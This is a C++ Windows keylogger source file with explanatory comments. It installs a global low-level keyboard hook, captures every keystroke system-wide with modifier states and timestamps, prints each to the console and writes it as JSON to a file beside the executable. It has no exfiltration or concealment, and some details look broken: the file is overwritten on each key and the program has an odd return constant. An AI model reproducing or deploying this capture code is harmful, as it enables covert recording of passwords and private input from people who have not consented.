#include <iostream>
#include <windows.h>
#include <vector>
#include <algorithm>
#include <fstream>

#include <filesystem>
namespace fs = std::filesystem;

//status symbols
const char* k = "[+] ";
const char* i = "[*] ";
const char* e = "[-] ";

//state-based keys:
bool ctrl = false;
bool shift = false;
bool alt = false;


//Create a list of keys to ignore:
const std::vector<int> vSysKeys = {
	VK_MENU, VK_LMENU, VK_RMENU, 
	VK_SHIFT, VK_LSHIFT, VK_RSHIFT,
	VK_CONTROL, VK_LCONTROL, VK_RCONTROL};

HHOOK hHook;

KBDLLHOOKSTRUCT* hsData;

std::string key_press_data;


//paths:
fs::path pSelf;
fs::path pOut;


//Callback function for the hook!
LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
	
	//Leave early if not a relevent msg
	if (code < 0) { return CallNextHookEx(hHook, code, wParam, lParam);}

	//lParam is a long long int that contains the memory address of a struct
	//We need to actually create a proper pointer and set lParam as the address:
	//We do this by creating a pointer of the type we want to access.
	KBDLLHOOKSTRUCT* ptrKBDStruct;

	//We then cast lParam to that type (pointer of KBDLLHOOKSTRUCT)
	ptrKBDStruct = (KBDLLHOOKSTRUCT*)lParam;

	//Now to read the data, we need to de-refrence the new pointer and get the data:
	KBDLLHOOKSTRUCT data = *ptrKBDStruct;

	//std::cout << i << "Key Code: " << data.vkCode << std::endl;
	//std::cout << i << "Scan Code: " << data.scanCode << std::endl;
	//std::cout << i << "flags: " << data.flags << std::endl;
	//std::cout << i << "time: " << data.time << std::endl;
	//std::cout << i << "info: " << data.dwExtraInfo << std::endl;

	// === State Keys ===
	//wParam contains type of msg, WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
		switch (data.vkCode){
			case VK_CONTROL:
			case VK_RCONTROL:
			case VK_LCONTROL:
				ctrl = true;
				break;

			case VK_SHIFT:
			case VK_RSHIFT:
			case VK_LSHIFT:
				shift = true;
				break;

			case VK_MENU:
			case VK_RMENU:
			case VK_LMENU:
				alt = true;
				break;
		}

	} else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
		switch (data.vkCode){

			case VK_CONTROL:
			case VK_RCONTROL:
			case VK_LCONTROL:
				ctrl = false;
				break;

			case VK_SHIFT:
			case VK_RSHIFT:
			case VK_LSHIFT:
				shift = false;
				break;

			case VK_MENU:
			case VK_RMENU:
			case VK_LMENU:
				alt = false;
				break;
		}
	}
	// ==================
	

	//check if the pressed key is not one of them:
	if (std::find(vSysKeys.begin(), vSysKeys.end(), data.vkCode) == vSysKeys.end()){
		//If it is a down stroke:
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
			//print to terminal:
			std::cout << i << "Key: " << data.vkCode << " | Shift: " << shift << " | Ctrl: " << ctrl << " | Alt: " << alt <<  std::endl;



			//create/ref file
			std::ofstream MyFile(pOut);

			if (MyFile.is_open()) {
				//write to file:
				MyFile << "{\n\t\"vkCode\": \"" << data.vkCode << "\",\n\t\"mods\": {\"shft\": "<< shift <<", \"ctrl\": "<< ctrl <<", \"alt\": "<< alt <<"},\n\t\"time\": "<< data.time << ",\n},\n";
				MyFile.close();
			}

			////Build json format:
			//key_press_data = {
			//	"vkCode": data.vkCode,
			//	"Mods": {"shft": shift, "ctrl": ctrl, "alt": alt},
			//	"time": data.time
			//}

		}
	}


	//Send to the next procedure
	return CallNextHookEx(hHook, code, wParam, lParam);
}


// === Main ===
int main(int argc, char* argv[]){

	//get root dir:
	char szBuffer[MAX_PATH];

	//Get the location of self:
	GetModuleFileNameA(
		NULL, //The proc handle you want to get the path to. when null, returns path of self 
		szBuffer, //A pointer to a buffer that receives the fully qualified path of the module.
		MAX_PATH); //The max size of the path

	//set output path
	pSelf = szBuffer;
	pOut = pSelf.parent_path() / "data" / "out.json";

	//Verify file:
	if (fs::exists(pOut) == false) {
		std::cout << i << pOut.filename() << " does not exist, it will be created." << std::endl;
	} 
	else {std::cout << k << pOut.filename() << " found." << std::endl;}



	//Set Windows Hook parameters
	int idHook = WH_KEYBOARD_LL;

	HOOKPROC lpfn = SomeProc; //pointer to the hook callback fn

	//Relevenat for hooking into specifc apps:
	HINSTANCE hmod = NULL; //
	DWORD dwThreadId = 0; //The thread containing the procedure

	//Install Hook!
	hHook = SetWindowsHookExA(idHook, lpfn, hmod, dwThreadId);

	//Check hook installed
	if (hHook == NULL) {
		std::cout << e << "Hook not installed. err:" << GetLastError() << std::endl;
		return 1;
	}

	std::cout << k << "Hook succesfully installed!" << std::endl;

	//Loop:
	MSG msg;

	while (GetMessage(&msg, 0, 0, 0)) {

		//continues msg through queue
		PeekMessage(&msg, 0, 0, 0,PM_REMOVE);
	}

	return WN_SUCCESS;
}